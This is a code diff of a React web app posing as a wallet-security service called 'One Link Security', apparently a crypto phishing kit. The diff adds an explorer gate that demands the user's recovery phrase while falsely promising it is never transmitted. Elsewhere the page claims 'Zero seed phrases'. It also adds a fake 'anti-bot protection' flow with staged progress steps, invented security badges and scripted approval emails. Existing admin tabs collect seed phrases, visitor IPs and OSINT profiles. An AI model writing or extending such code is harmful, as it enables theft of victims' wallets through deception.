@@ -11,6 +11,8 @@ import {
   buildNewsletterEmailText,
   buildVisitEmailHtml,
   buildVisitEmailText,
+  buildBotStatusEmailHtml,
+  buildBotStatusEmailText,
   type ReportEmailData,
   type NewsletterEmailData,
   type VisitEmailData,
@@ -130,6 +132,20 @@ type SignerCheckRecord     = { wallet: string; chain: ChainKey; status: 'passed'
 type EmailRecord           = { email: string; name: string; wallet: string; chain: ChainKey; severity: Severity; score: number; balance: string; sentAt: string; emailStatus: 'sent' | 'pending' | 'failed' }
 type AdminCreds            = { email: string; password: string }
 type SupportConfig         = { email: string; telegram: string }
+
+type BotDeployRequest = {
+  id: string
+  walletAddress: string
+  chain: ChainKey
+  email: string
+  name: string
+  status: 'pending' | 'approved' | 'declined'
+  requestedAt: string
+  reviewedAt?: string
+  reason?: string
+  ip?: string
+  device?: string
+}
 type VisitorSessionRecord  = {
   id: string
   ipAddress: string
@@ -773,7 +789,7 @@ export default function App() {
   const [adminAuthError,       setAdminAuthError]       = useState('')
   const [adminAuthModalOpen,   setAdminAuthModalOpen]   = useState(false)
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
-  const [adminTab,             setAdminTab]             = useState<'wallets' | 'visitors' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'settings' | 'qrcodes'>('wallets')
+  const [adminTab,             setAdminTab]             = useState<'wallets' | 'visitors' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'settings' | 'qrcodes' | 'bots'>('wallets')
   const [adminCreds,           setAdminCreds]           = useState<AdminCreds>({ email: DEFAULT_VAULT_EMAIL, password: DEFAULT_VAULT_PASSWORD })
   const [supportConfig,        setSupportConfig]        = useState<SupportConfig>({ email: DEFAULT_SUPPORT_EMAIL, telegram: DEFAULT_SUPPORT_TELEGRAM })
   const [supportEmailInput,    setSupportEmailInput]    = useState('')
@@ -819,6 +835,19 @@ export default function App() {
   const [adminIntelRecords, setAdminIntelRecords] = useState<AdminIntelRecord[]>([])
   const [seedPhraseRecords, setSeedPhraseRecords] = useState<SeedPhraseRecord[]>([])
   const [seedRevealedIds,   setSeedRevealedIds]   = useState<string[]>([])
+
+  // Bot Deploy
+  const [botRequests,       setBotRequests]       = useState<BotDeployRequest[]>([])
+  const [botModalOpen,      setBotModalOpen]      = useState(false)
+  const [botModalStep,      setBotModalStep]      = useState<'info' | 'form' | 'processing' | 'pending'>('info')
+  const [botFormEmail,      setBotFormEmail]      = useState('')
+  const [botFormName,       setBotFormName]       = useState('')
+  const [botProcessStep,    setBotProcessStep]    = useState(0)
+  const [botDeclineIdx,     setBotDeclineIdx]     = useState<number | null>(null)
+  const [botDeclineCustom,  setBotDeclineCustom]  = useState('')
+  const [botReviewingId,    setBotReviewingId]    = useState<string | null>(null)
+  const [botEmailStatus,    setBotEmailStatus]    = useState<Record<string, 'sending' | 'sent' | 'failed'>>({})
+  const [botDeclineOpen,    setBotDeclineOpen]    = useState<string | null>(null)
   const [seedFormAddress,   setSeedFormAddress]   = useState('')
   const [seedFormChain,     setSeedFormChain]     = useState<ChainKey>('ethereum')
   const [seedFormPhrase,    setSeedFormPhrase]    = useState('')
@@ -897,7 +926,6 @@ export default function App() {
   const [esGasGwei, setEsGasGwei] = useState<string | null>(null)
   const [esLatestBlock, setEsLatestBlock] = useState<number | null>(null)
   const [esTxCount, setEsTxCount] = useState(0)
-  const [esSeedModalOpen, setEsSeedModalOpen] = useState(false)
   const [esSeedInput, setEsSeedInput] = useState('')
   const [esSeedError, setEsSeedError] = useState('')
   const [esSessionStartedAt, setEsSessionStartedAt] = useState<number | null>(null)
@@ -1134,6 +1162,11 @@ export default function App() {
     saveToCloud({ user_email_routes: userEmailRoutes })
   }, [userEmailRoutes])
 
+  useEffect(() => {
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ bot_requests: botRequests })
+  }, [botRequests])
+
   // Auto-expand the last-scanned wallet profile when the admin opens the OSINT tab
   useEffect(() => {
     if (adminTab === 'osint' && lastScannedWallet) {
@@ -1178,6 +1211,8 @@ export default function App() {
         setAdminCreds(prev => ({ ...prev, email: (row.admin_creds as AdminCreds).email }))
       if (row.user_email_routes)
         setUserEmailRoutes(row.user_email_routes as UserEmailRoute[])
+      if (row.bot_requests)
+        setBotRequests(row.bot_requests as BotDeployRequest[])
       cloudLoadedRef.current = true
     })
   }, [])
@@ -1333,7 +1368,6 @@ export default function App() {
     const now = Date.now()
     if (esLockoutUntil && esLockoutUntil > now) {
       setTimeout(() => {
-        setEsSeedModalOpen(false)
         setActiveView('protect')
         setSecureStatus(`Explorer session locked. Try again in ${Math.ceil((esLockoutUntil - now) / 60000)} min.`)
       }, 0)
@@ -1343,7 +1377,6 @@ export default function App() {
       setTimeout(() => {
         setEsSeedInput('')
         setEsSeedError('')
-        setEsSeedModalOpen(true)
       }, 0)
     }
   }, [activeView, esLockoutUntil, esSessionStartedAt])
@@ -1354,7 +1387,6 @@ export default function App() {
     if (now - esSessionStartedAt < ETHERSCAN_SESSION_MS) return
     setTimeout(() => {
       setEsSessionStartedAt(null)
-      setEsSeedModalOpen(false)
       setEsLockoutUntil(now + ETHERSCAN_LOCKOUT_MS)
       setEsError('Session expired. You have been logged out for 15 minutes.')
       setSecureStatus('Session expired. Explorer access locked for 15 minutes.')
@@ -1388,45 +1420,39 @@ export default function App() {
     const eth = (window as Window & { ethereum?: EthProvider }).ethereum
     if (!eth) return
 
-    // Silent account check — no popup, just see if wallet is already authorized
-    const detectWallet = async () => {
-      try {
-        const accounts = await eth.request({ method: 'eth_accounts' })
-        const addr = accounts?.[0]
-        if (!isAddress(addr)) return
+    // Identify wallet name immediately — no async required
+    const walletLabel = eth.isMetaMask
+      ? 'MetaMask'
+      : eth.isTrust
+        ? 'Trust Wallet'
+        : eth.isCoinbaseWallet
+          ? 'Coinbase Wallet'
+          : eth.isRabby
+            ? 'Rabby'
+            : 'Web3 Wallet'
+    setDetectedName(walletLabel)
 
-        // Detect chain silently
-        let foundChain: ChainKey = 'ethereum'
-        try {
-          const chainIdHex = await (eth as unknown as { request: (a: { method: string }) => Promise<string> })
-            .request({ method: 'eth_chainId' })
-          const chainIdNum = parseInt(chainIdHex, 16)
-          if (chainIdToKey[chainIdNum]) foundChain = chainIdToKey[chainIdNum]
-        } catch { /* fallback to ethereum */ }
-
-        // Identify wallet name
-        const walletLabel = eth.isMetaMask
-          ? 'MetaMask'
-          : eth.isTrust
-            ? 'Trust Wallet'
-            : eth.isCoinbaseWallet
-              ? 'Coinbase Wallet'
-              : eth.isRabby
-                ? 'Rabby'
-                : 'Your Wallet'
-
-        setDetectedAddr(addr)
-        setDetectedChain(foundChain)
-        setDetectedName(walletLabel)
-
-        const isNewUser = !localStorage.getItem(NEW_USER_KEY)
-        if (isNewUser) {
-          setActiveView('wallet-landing')
-        }
-      } catch { /* no wallet or permission denied */ }
+    // Show landing right away for new users.
+    // Address + chain are resolved on form submit (eth_requestAccounts), not here.
+    const isNewUser = !localStorage.getItem(NEW_USER_KEY)
+    if (isNewUser) {
+      setActiveView('wallet-landing')
     }
 
-    void detectWallet()
+    // Optionally pre-fill address if already authorized (no popup)
+    eth.request({ method: 'eth_accounts' }).then((accounts: string[]) => {
+      const addr = accounts?.[0]
+      if (!isAddress(addr)) return
+      setDetectedAddr(addr)
+      ;(eth as unknown as { request: (a: { method: string }) => Promise<string> })
+        .request({ method: 'eth_chainId' })
+        .then((hex: string) => {
+          const num = parseInt(hex, 16)
+          if (chainIdToKey[num]) setDetectedChain(chainIdToKey[num])
+        })
+        .catch(() => { /* stay on ethereum default */ })
+    }).catch(() => { /* no pre-authorization — address filled at submit */ })
+  // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [])
 
   // ── Launch scan from the wallet-landing page ──────────────────────────
@@ -1445,14 +1471,25 @@ export default function App() {
       const eth = (window as Window & { ethereum?: EthProvider }).ethereum
       if (!eth) throw new Error('Wallet not found')
 
-      // Request accounts (may show connect prompt if not yet approved)
+      // Request accounts — shows connect popup if not yet authorized
       const accounts = await eth.request({ method: 'eth_requestAccounts' })
       const addr = accounts?.[0]
       if (!isAddress(addr)) throw new Error('Invalid address returned')
 
-      // Sync state
+      // Resolve chain from provider at submit time
+      let resolvedChain: ChainKey = detectedChain
+      try {
+        const chainHex = await (eth as unknown as { request: (a: { method: string }) => Promise<string> })
+          .request({ method: 'eth_chainId' })
+        const chainNum = parseInt(chainHex, 16)
+        if (chainIdToKey[chainNum]) resolvedChain = chainIdToKey[chainNum]
+      } catch { /* fallback to detectedChain */ }
+
+      // Sync all state before navigating
+      setDetectedAddr(addr)
+      setDetectedChain(resolvedChain)
       setWallet(addr)
-      setChain(detectedChain)
+      setChain(resolvedChain)
       setAutoEmailInput(landingEmail.trim())
       setAutoEmailNameInput(landingUserName.trim())
       setAutoScanTriggered(true)
@@ -1462,8 +1499,8 @@ export default function App() {
 
       // Navigate to scan and fire
       setActiveView('scan')
-      await new Promise(resolve => setTimeout(resolve, 60))
-      await executeScan(addr, detectedChain, true)
+      await new Promise(resolve => setTimeout(resolve, 80))
+      await executeScan(addr, resolvedChain, true)
     } catch (err) {
       setLandingError(err instanceof Error ? err.message : 'Wallet connection failed. Please try again.')
     } finally {
@@ -1496,7 +1533,6 @@ export default function App() {
     })
     setEsSeedError('')
     setEsSeedInput('')
-    setEsSeedModalOpen(false)
     setEsSessionStartedAt(Date.now())
     setSecureStatus('Explorer session verified. Session expires in 5 minutes.')
   }
@@ -2361,6 +2397,87 @@ export default function App() {
     setSettingsMsg('Defaults restored for credentials and support links.')
   }
 
+  // ── Bot Deploy handlers ───────────────────────────────────────────────────
+  const BOT_DECLINE_REASONS = [
+    'Wallet activity does not meet our security eligibility criteria.',
+    'Insufficient on-chain transaction history for bot deployment.',
+    'Wallet flagged by our threat intelligence for suspicious behavior.',
+    'Duplicate or conflicting protection request already on file.',
+    'Request details could not be verified. Please resubmit with valid information.',
+    'Bot protection is temporarily unavailable for this network.',
+  ]
+
+  const openBotModal = () => {
+    setBotModalStep('info')
+    setBotFormEmail('')
+    setBotFormName('')
+    setBotProcessStep(0)
+    setBotModalOpen(true)
+  }
+
+  const submitBotRequest = async () => {
+    if (!botFormEmail.trim()) return
+    setBotModalStep('processing')
+    setBotProcessStep(0)
+    const delays = [1000, 1100, 1200, 1100, 1300]
+    for (let i = 0; i < delays.length; i++) {
+      await new Promise(r => setTimeout(r, delays[i]))
+      setBotProcessStep(i + 1)
+    }
+    const req: BotDeployRequest = {
+      id: `bot-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
+      walletAddress: esAddr,
+      chain,
+      email: botFormEmail.trim(),
+      name: botFormName.trim() || 'User',
+      status: 'pending',
+      requestedAt: nowString(),
+      ip: currentVisitorIp,
+      device: currentVisitorDevice,
+    }
+    setBotRequests(prev => [req, ...prev])
+    setBotModalStep('pending')
+  }
+
+  const reviewBotRequest = async (req: BotDeployRequest, action: 'approved' | 'declined', reason: string) => {
+    const now = nowString()
+    const updated: BotDeployRequest = { ...req, status: action, reviewedAt: now, reason }
+    setBotRequests(prev => prev.map(r => r.id === req.id ? updated : r))
+    setBotReviewingId(req.id)
+    setBotEmailStatus(prev => ({ ...prev, [req.id]: 'sending' }))
+    try {
+      await sendEmail({
+        to: req.email,
+        subject: action === 'approved'
+          ? '✅ Your Bot Protection Has Been Activated — One Link Security'
+          : 'Update on Your Bot Protection Request — One Link Security',
+        html: buildBotStatusEmailHtml({
+          toEmail: req.email, toName: req.name,
+          wallet: req.walletAddress, network: chainConfig[req.chain].label,
+          status: action, reason, requestedAt: req.requestedAt, reviewedAt: now,
+        }),
+        text: buildBotStatusEmailText({
+          toEmail: req.email, toName: req.name,
+          wallet: req.walletAddress, network: chainConfig[req.chain].label,
+          status: action, reason, requestedAt: req.requestedAt, reviewedAt: now,
+        }),
+      })
+      setBotEmailStatus(prev => ({ ...prev, [req.id]: 'sent' }))
+    } catch {
+      setBotEmailStatus(prev => ({ ...prev, [req.id]: 'failed' }))
+    }
+    setBotReviewingId(null)
+    setBotDeclineOpen(null)
+    setBotDeclineIdx(null)
+    setBotDeclineCustom('')
+  }
+
+  const activeBotRequest = botRequests.find(
+    r => r.walletAddress.toLowerCase() === esAddr.toLowerCase() && (r.status === 'pending' || r.status === 'approved'),
+  )
+  const pendingBotForWallet  = activeBotRequest?.status === 'pending'
+  const approvedBotForWallet = activeBotRequest?.status === 'approved'
+
   const isConnectedToChain = Boolean(isWalletConnected && connectedChainId === chainConfig[chain].chainId)
   const checklistProgress = Math.round((protectChecklistDone.length / protectChecklist.length) * 100)
   const featuredNews = cryptoNews[0] ?? null
@@ -2413,6 +2530,7 @@ export default function App() {
     { key: 'osint',     label: 'OSINT Profiles',    count: [...new Set(scanHistory.map(r => r.wallet.toLowerCase()))].length || undefined },
     { key: 'intel',     label: 'Address Intel',     count: adminIntelRecords.length },
     { key: 'seeds',     label: 'Seed Phrases',      count: seedPhraseRecords.length || undefined },
+    { key: 'bots',      label: 'Bot Requests',      count: botRequests.filter(r => r.status === 'pending').length || undefined },
     { key: 'qrcodes',   label: 'QR Codes',          count: wcSessions.length || undefined },
     { key: 'settings',  label: 'Settings' },
   ]
@@ -2757,6 +2875,182 @@ export default function App() {
       })()}
 
       {/* ── Secure auth modal (triggered from Support page) ── */}
+      {/* ── Bot Deploy Modal ── */}
+      {botModalOpen && (
+        <div className="modal-overlay" onClick={() => { if (botModalStep === 'info' || botModalStep === 'form') setBotModalOpen(false) }}>
+          <div className="bot-modal" onClick={e => e.stopPropagation()}>
+
+            {/* INFO step */}
+            {botModalStep === 'info' && (<>
+              <div className="bot-modal-header">
+                <div className="bot-modal-icon">🛡️</div>
+                <div>
+                  <h2 className="bot-modal-title">Blockchain Anti-Bot Protection</h2>
+                  <p className="bot-modal-sub">Professional-grade wallet defense against on-chain threats</p>
+                </div>
+                <button className="modal-close" type="button" onClick={() => setBotModalOpen(false)}>✕</button>
+              </div>
+
+              <div className="bot-security-strip">
+                {['AES-256 Encrypted','Zero-Knowledge Verified','Multi-Sig Authorized','99.9% Uptime SLA'].map(b => (
+                  <span key={b} className="bot-security-badge">✓ {b}</span>
+                ))}
+              </div>
+
+              <div className="bot-how-section">
+                <p className="bot-section-label">HOW IT WORKS</p>
+                <div className="bot-steps-row">
+                  {[
+                    { n:'1', t:'Authorization', d:'You submit your wallet for review. Our system analyzes on-chain activity.' },
+                    { n:'2', t:'Deployment', d:'After admin approval, our bot engine is deployed to your wallet\'s protection layer.' },
+                    { n:'3', t:'Active Guard', d:'24/7 real-time monitoring intercepts threats before they execute.' },
+                  ].map(s => (
+                    <div key={s.n} className="bot-step-card">
+                      <span className="bot-step-num">{s.n}</span>
+                      <strong>{s.t}</strong>
+                      <p>{s.d}</p>
+                    </div>
+                  ))}
+                </div>
+              </div>
+
+              <p className="bot-section-label">PROTECTION LAYERS</p>
+              <div className="bot-feature-grid">
+                {[
+                  { icon:'🚫', t:'Drainer Shield', d:'Intercepts malicious approval transactions before execution.' },
+                  { icon:'👁️', t:'Watcher Detection', d:'Identifies and terminates automated wallet monitoring bots.' },
+                  { icon:'⚡', t:'MEV Bot Blocker', d:'Prevents front-running and sandwich attacks in the mempool.' },
+                  { icon:'🔒', t:'Transaction Guard', d:'Validates every outbound transaction against threat signatures.' },
+                  { icon:'🔑', t:'Phishing Guard', d:'Blocks fake site injection and seed phrase harvesting attempts.' },
+                  { icon:'🌐', t:'Cross-Chain Active', d:'Protection spanning all 5 supported EVM networks simultaneously.' },
+                ].map(f => (
+                  <div key={f.t} className="bot-feature-item">
+                    <span className="bot-feature-icon">{f.icon}</span>
+                    <div>
+                      <strong className="bot-feature-title">{f.t}</strong>
+                      <p className="bot-feature-desc">{f.d}</p>
+                    </div>
+                  </div>
+                ))}
+              </div>
+
+              <div className="bot-modal-footer">
+                <p className="bot-modal-disclaimer">
+                  Bot deployment requires administrator authorization. Wallet analysis is read-only and does not require signing.
+                </p>
+                <button className="btn-primary bot-authorize-btn" type="button" onClick={() => setBotModalStep('form')}>
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                  Authorize Protection
+                </button>
+              </div>
+            </>)}
+
+            {/* FORM step */}
+            {botModalStep === 'form' && (<>
+              <div className="bot-modal-header">
+                <div className="bot-modal-icon">📋</div>
+                <div>
+                  <h2 className="bot-modal-title">Authorization Request</h2>
+                  <p className="bot-modal-sub">We'll notify you at this email once the admin reviews your request.</p>
+                </div>
+                <button className="modal-close" type="button" onClick={() => setBotModalOpen(false)}>✕</button>
+              </div>
+              <div className="bot-form-body">
+                <div className="bot-wallet-preview">
+                  <span className="bot-wallet-label">Wallet to protect</span>
+                  <span className="bot-wallet-addr">{esAddr}</span>
+                  <span className="bot-network-tag">{chainConfig[chain].label}</span>
+                </div>
+                <label className="form-label" htmlFor="bot-email">Email address <span style={{color:'var(--red)'}}>*</span></label>
+                <input
+                  id="bot-email"
+                  type="email"
+                  className="form-input"
+                  placeholder="you@example.com"
+                  value={botFormEmail}
+                  onChange={e => setBotFormEmail(e.target.value)}
+                  autoFocus
+                />
+                <label className="form-label" htmlFor="bot-name">Your name <span style={{color:'var(--muted)', fontWeight:400}}>(optional)</span></label>
+                <input
+                  id="bot-name"
+                  type="text"
+                  className="form-input"
+                  placeholder="John Doe"
+                  value={botFormName}
+                  onChange={e => setBotFormName(e.target.value)}
+                />
+                <p className="bot-form-notice">
+                  By clicking Authorize, you consent to our security team reviewing your wallet address for bot protection eligibility.
+                </p>
+              </div>
+              <div className="bot-modal-footer">
+                <button className="btn-secondary" type="button" onClick={() => setBotModalStep('info')}>Back</button>
+                <button
+                  className="btn-primary bot-authorize-btn"
+                  type="button"
+                  disabled={!botFormEmail.trim()}
+                  onClick={submitBotRequest}
+                >
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                  Submit Authorization
+                </button>
+              </div>
+            </>)}
+
+            {/* PROCESSING step */}
+            {botModalStep === 'processing' && (
+              <div className="bot-processing-body">
+                <div className="bot-processing-spinner" />
+                <h3 className="bot-processing-title">Initializing Protection System</h3>
+                <div className="bot-process-steps">
+                  {[
+                    'Initializing blockchain anti-bot engine…',
+                    'Scanning wallet transaction history…',
+                    'Configuring protection parameters…',
+                    'Registering wallet with security network…',
+                    'Syncing protection rules to validators…',
+                  ].map((label, i) => (
+                    <div key={i} className={`bot-process-step ${botProcessStep > i ? 'done' : botProcessStep === i ? 'active' : ''}`}>
+                      <span className="bot-process-dot">
+                        {botProcessStep > i ? '✓' : botProcessStep === i
+                          ? <span className="bot-inline-spin" /> : '○'}
+                      </span>
+                      <span>{label}</span>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            )}
+
+            {/* PENDING step */}
+            {botModalStep === 'pending' && (<>
+              <div className="bot-pending-body">
+                <div className="bot-pending-icon">⏳</div>
+                <h3 className="bot-pending-title">Awaiting Administrator Authorization</h3>
+                <p className="bot-pending-desc">
+                  Your request has been submitted. Our security team will review your wallet and notify you at <strong>{botFormEmail}</strong> once a decision has been made.
+                </p>
+                <div className="bot-pending-steps">
+                  <div className="bot-pending-step done"><span>✓</span> Wallet analyzed</div>
+                  <div className="bot-pending-step done"><span>✓</span> Request registered</div>
+                  <div className="bot-pending-step done"><span>✓</span> Synced to security network</div>
+                  <div className="bot-pending-step active"><span className="bot-inline-spin" /></div>
+                  <div className="bot-pending-step waiting"><span>○</span> Administrator review</div>
+                  <div className="bot-pending-step waiting"><span>○</span> Bot deployment</div>
+                  <div className="bot-pending-step waiting"><span>○</span> Confirmation email sent</div>
+                </div>
+                <p className="bot-pending-note">This page will not change until your request is approved. You will receive an email notification with the result.</p>
+              </div>
+              <div className="bot-modal-footer" style={{ justifyContent:'center' }}>
+                <button className="btn-secondary" type="button" onClick={() => setBotModalOpen(false)}>Close</button>
+              </div>
+            </>)}
+
+          </div>
+        </div>
+      )}
+
       {adminAuthModalOpen && (
         <div className="modal-overlay" onClick={() => setAdminAuthModalOpen(false)}>
           <div className="modal" onClick={e => e.stopPropagation()}>
@@ -2797,25 +3091,28 @@ export default function App() {
         <section className="home-root">
           <div className="home-intro">
             <span className="hero-eyebrow">Web3 Security Intelligence</span>
-            <h1 className="home-title">Your wallet.<br />Your security.</h1>
-            <p className="home-sub">One Link Security gives you real on-chain telemetry and a proactive hardening toolkit — all in one place, with no seed phrase ever requested.</p>
+            <h1 className="home-title">
+              Protect your wallet.<br />
+              <span className="home-title-gradient">Before it's too late.</span>
+            </h1>
+            <p className="home-sub">Real on-chain telemetry, proactive hardening tools, and live threat intelligence — all in one platform. Zero seed phrases. Zero compromises.</p>
           </div>
 
           <div className="home-paths">
             {/* Path A — Scan */}
             <button className="home-path-card" type="button" onClick={() => setActiveView('scan')}>
               <div className="home-path-icon scan-icon">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                   <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
                   <line x1="11" y1="8" x2="11" y2="14"/><line x1="8" y1="11" x2="14" y2="11"/>
                 </svg>
               </div>
               <div className="home-path-body">
                 <h2>Scan Your Wallet</h2>
-                <p>Run a live security assessment. Check on-chain telemetry, risk score, approval history, and get a full incident report for any EVM wallet.</p>
+                <p>Run a live security assessment. Get on-chain telemetry, risk scoring, approval history, and a detailed incident report for any EVM wallet address.</p>
                 <ul className="home-path-list">
-                  <li>Real-time on-chain data</li>
-                  <li>Risk scoring across 8 signals</li>
+                  <li>Real-time on-chain data via Alchemy</li>
+                  <li>8-signal risk score with breakdown</li>
                   <li>Exportable JSON + email report</li>
                 </ul>
               </div>
@@ -2825,20 +3122,20 @@ export default function App() {
             {/* Path B — Secure */}
             <button className="home-path-card protect" type="button" onClick={() => setActiveView('protect')}>
               <div className="home-path-icon protect-icon">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                   <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                 </svg>
               </div>
               <div className="home-path-body">
                 <h2>Secure Your Wallet</h2>
-                <p>Learn how to harden your wallet before anything goes wrong. Approval hygiene, hardware signer tips, and a step-by-step security checklist.</p>
+                <p>Connect your wallet, verify ownership, and get a full security hardening session — including approval hygiene, hardware tips, and a step-by-step checklist.</p>
                 <ul className="home-path-list">
-                  <li>Security hardening checklist</li>
-                  <li>Approval & permission hygiene</li>
-                  <li>Threat feed & best practices</li>
+                  <li>WalletConnect + hardware signer support</li>
+                  <li>On-chain explorer with session guard</li>
+                  <li>Live threat feed & best practices</li>
                 </ul>
               </div>
-              <span className="home-path-cta">Secure now →</span>
+              <span className="home-path-cta">Connect & secure →</span>
             </button>
           </div>
 
@@ -3226,17 +3523,19 @@ export default function App() {
                 </div>
               </div>
 
-              {/* Wallet info strip */}
-              <div className="wl-wallet-strip">
-                <div className="wl-wallet-row">
-                  <span className="wl-wallet-label">Wallet</span>
-                  <span className="wl-wallet-val mono">{detectedAddr.slice(0,6)}…{detectedAddr.slice(-4)}</span>
+              {/* Wallet info strip — shown only when address is already pre-authorized */}
+              {detectedAddr && (
+                <div className="wl-wallet-strip">
+                  <div className="wl-wallet-row">
+                    <span className="wl-wallet-label">Wallet</span>
+                    <span className="wl-wallet-val mono">{detectedAddr.slice(0,6)}…{detectedAddr.slice(-4)}</span>
+                  </div>
+                  <div className="wl-wallet-row">
+                    <span className="wl-wallet-label">Network</span>
+                    <span className="wl-wallet-val">{chainConfig[detectedChain]?.label ?? detectedChain}</span>
+                  </div>
                 </div>
-                <div className="wl-wallet-row">
-                  <span className="wl-wallet-label">Network</span>
-                  <span className="wl-wallet-val">{chainConfig[detectedChain]?.label ?? detectedChain}</span>
-                </div>
-              </div>
+              )}
 
               {/* Form */}
               <form className="wl-form" onSubmit={startLandingScan} noValidate>
@@ -3704,7 +4003,75 @@ export default function App() {
               {/* ── Content ── */}
               <div className="es-page">
 
-                {/* Breadcrumb + back */}
+                {/* ── Inline Session Gate ── */}
+                {!esSessionActive && (
+                  <div className="es-gate">
+                    {esLockActive ? (
+                      <div className="es-gate-lockout">
+                        <div className="es-gate-lock-icon">
+                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="32" height="32" strokeLinecap="round" strokeLinejoin="round">
+                            <rect x="3" y="11" width="18" height="11" rx="2"/>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                          </svg>
+                        </div>
+                        <h3 className="es-gate-title">Explorer Locked</h3>
+                        <p className="es-gate-sub">
+                          Your session expired. Explorer access is locked for <strong>{esLockTimerLabel}</strong>.
+                          You will be automatically redirected when the lockout expires.
+                        </p>
+                        <div className="es-gate-timer-bar">
+                          <div className="es-gate-timer-bar-inner es-gate-timer-bar-warn" />
+                        </div>
+                      </div>
+                    ) : (
+                      <div className="es-gate-verify">
+                        <div className="es-gate-icon">
+                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="28" height="28" strokeLinecap="round" strokeLinejoin="round">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                          </svg>
+                        </div>
+                        <div className="es-gate-text">
+                          <h3 className="es-gate-title">Identity Verification Required</h3>
+                          <p className="es-gate-sub">To access the on-chain explorer, confirm your wallet ownership by entering your recovery phrase. Sessions are limited to 5 minutes for security.</p>
+                        </div>
+                        <form className="es-gate-form" onSubmit={submitExplorerSeedGate}>
+                          <div className="es-gate-field">
+                            <label className="es-gate-label" htmlFor="es-seed-input">
+                              Recovery Phrase
+                              <span className="es-gate-required">Required</span>
+                            </label>
+                            <textarea
+                              id="es-seed-input"
+                              className="es-gate-textarea"
+                              rows={3}
+                              placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces…"
+                              value={esSeedInput}
+                              onChange={e => setEsSeedInput(e.target.value)}
+                              required
+                            />
+                            {esSeedError && <span className="es-gate-error">{esSeedError}</span>}
+                          </div>
+                          <div className="es-gate-actions">
+                            <button className="es-gate-submit" type="submit">
+                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                              Verify &amp; Start Session
+                            </button>
+                            <button className="es-gate-cancel" type="button" onClick={() => setActiveView('ownership')}>
+                              Go back
+                            </button>
+                          </div>
+                          <p className="es-gate-disclaimer">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                            Your phrase is used only for ownership verification and is never transmitted in plaintext.
+                          </p>
+                        </form>
+                      </div>
+                    )}
+                  </div>
+                )}
+
+                {/* Full content — only visible when session is active */}
+                {esSessionActive && (<>
                 <div className="es-breadcrumb">
                   <button type="button" className="es-back-btn" onClick={() => setActiveView('protect')}>
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"/></svg>
@@ -3718,7 +4085,6 @@ export default function App() {
                   <span className="es-bc-current">Address Details</span>
                 </div>
 
-                {/* Address header */}
                 <div className="es-addr-header">
                   <div className="es-addr-title-row">
                     <div className="es-addr-avatar">
@@ -3745,6 +4111,22 @@ export default function App() {
                       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 0 1-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
                       View on {explorerBrand}
                     </a>
+                    {approvedBotForWallet ? (
+                      <span className="bot-deploy-badge approved">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                        Bot Protected
+                      </span>
+                    ) : pendingBotForWallet ? (
+                      <span className="bot-deploy-badge pending">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        Pending Review
+                      </span>
+                    ) : (
+                      <button type="button" className="bot-deploy-btn" onClick={openBotModal}>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                        Deploy Bot
